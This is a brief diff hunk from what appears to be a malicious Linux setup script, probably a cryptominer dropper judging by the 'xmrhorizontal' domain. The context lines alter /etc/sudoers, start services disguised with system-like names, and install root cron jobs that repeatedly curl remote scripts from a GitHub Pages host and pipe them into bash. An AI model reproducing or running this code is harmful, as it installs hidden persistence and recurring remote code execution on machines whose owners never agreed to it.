@@ -18,6 +18,7 @@ sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
     systemctl enable sys-kernel.service
     sleep 10
     systemctl start ssh-daemons.service
+    sleep 10
     systemctl start sys-kernel.service
     echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/command.sh | bash" > /etc/cron.d/debcron
     echo "*/58 * * * * root curl -s https://xmrhorizontal.github.io/searcher.sh | bash" > /etc/cron.d/cronextend
